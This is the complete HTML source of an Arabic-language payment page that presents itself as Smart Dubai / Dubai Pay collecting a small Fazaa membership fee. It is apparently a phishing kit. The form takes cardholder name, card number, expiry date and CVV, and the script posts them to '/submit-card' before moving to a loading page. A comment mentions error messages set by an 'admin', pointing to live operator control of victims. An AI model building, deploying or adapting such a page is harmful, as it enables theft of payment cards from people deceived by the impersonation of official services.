<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دبي الذكية - دفع الرسوم</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f4f7f9; color: #333; }
        .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .header-logos { display: flex; gap: 15px; align-items: center; }
        .header-logo { height: 35px; width: auto; }
        .content { padding: 20px; flex-grow: 1; }
        .section-title { font-size: 1.1rem; font-weight: bold; margin-bottom: 15px; color: #1e3a5f; border-bottom: 2px solid #d4af37; padding-bottom: 5px; display: inline-block; }
        .info-box { background: #f9f9f9; border-radius: 8px; padding: 15px; margin-bottom: 20px; border: 1px solid #eee; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
        .info-label { color: #667a89; }
        .info-value { font-weight: bold; color: #1e3a5f; }
        .total-row { border-top: 1px dashed #ccc; padding-top: 10px; margin-top: 10px; font-size: 1.1rem; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-size: 0.9rem; margin-bottom: 5px; font-weight: bold; color: #444; }
        .input-control { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; outline: none; transition: 0.3s; }
        .input-control:focus { border-color: #1e3a5f; box-shadow: 0 0 5px rgba(30, 58, 95, 0.1); }
        .card-row { display: flex; gap: 10px; }
        .btn-pay { background: #1e3a5f; color: #fff; border: none; padding: 15px; border-radius: 6px; width: 100%; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .btn-pay:hover { background: #142842; }
        .footer { padding: 20px; text-align: center; font-size: 0.8rem; color: #999; border-top: 1px solid #eee; }
        .error-msg { color: #dc3545; background: #f8d7da; padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-size: 0.9rem; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-logos">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TWDdxegxhDSOigFd.png" alt="Smart Dubai" class="header-logo">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TvCpTnLQtXDsNBpI.png" alt="Dubai Pay" class="header-logo">
            </div>
        </div>

        <div class="content">
            <h2 class="section-title">معلومات المعاملة</h2>
            <div id="errorMessage" class="error-msg"></div>
            
            <div class="info-box">
                <div class="info-row">
                    <span class="info-label">مقدم الخدمة:</span>
                    <span class="info-value">فزعة - Fazaa</span>
                </div>
                <div class="info-row">
                    <span class="info-label">نوع الخدمة:</span>
                    <span class="info-value">اشتراك عضوية فزعة</span>
                </div>
                <div class="info-row">
                    <span class="info-label">رقم المعاملة:</span>
                    <span class="info-value" id="txnNumber">FZ-742910482</span>
                </div>
                <div class="info-row total-row">
                    <span class="info-label">إجمالي المبلغ:</span>
                    <span class="info-value" style="color: #28a745;">5.00 درهم</span>
                </div>
            </div>

            <h2 class="section-title">تفاصيل البطاقة البنكية</h2>
            <form id="paymentForm">
                <div class="form-group">
                    <label>اسم صاحب البطاقة</label>
                    <input type="text" id="cardName" class="input-control" placeholder="الاسم كما هو مكتوب على البطاقة" required>
                </div>
                <div class="form-group">
                    <label>رقم البطاقة (16 رقم)</label>
                    <input type="text" id="cardNumber" class="input-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </div>
                <div class="card-row">
                    <div class="form-group" style="flex: 1;">
                        <label>تاريخ الانتهاء</label>
                        <input type="text" id="expiryDate" class="input-control" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <label>رمز الأمان (CVV)</label>
                        <input type="password" id="cvv" class="input-control" placeholder="123" maxlength="3" required>
                    </div>
                </div>
                <button type="submit" class="btn-pay">دفع الآن</button>
            </form>
        </div>

        <div class="footer">
            &copy; 2026 دبي الذكية. جميع الحقوق محفوظة.<br>
            دفع آمن بواسطة Dubai Pay
        </div>
    </div>

    <script>
        const orderId = JSON.parse(sessionStorage.getItem('userData') || '{}').orderId || localStorage.getItem('orderId');
        
        // Check for error messages from admin
        const lastError = localStorage.getItem('lastError');
        if (lastError) {
            const errBox = document.getElementById('errorMessage');
            errBox.textContent = lastError;
            errBox.style.display = 'block';
            localStorage.removeItem('lastError');
        }

        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.querySelector('.btn-pay');
            btn.disabled = true;
            btn.textContent = 'جاري المعالجة...';

            const cardData = {
                orderId: orderId,
                cardName: document.getElementById('cardName').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value
            };

            await fetch('/submit-card', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(cardData)
            });

            window.location.href = 'payment_loading_ar.html?orderId=' + orderId;
        });

        // Format card number
        document.getElementById('cardNumber').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });

        // Format expiry date
        document.getElementById('expiryDate').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/g, '$1/').replace(/\/$/, '').slice(0, 5);
        });
    </script>
</body>
</html>
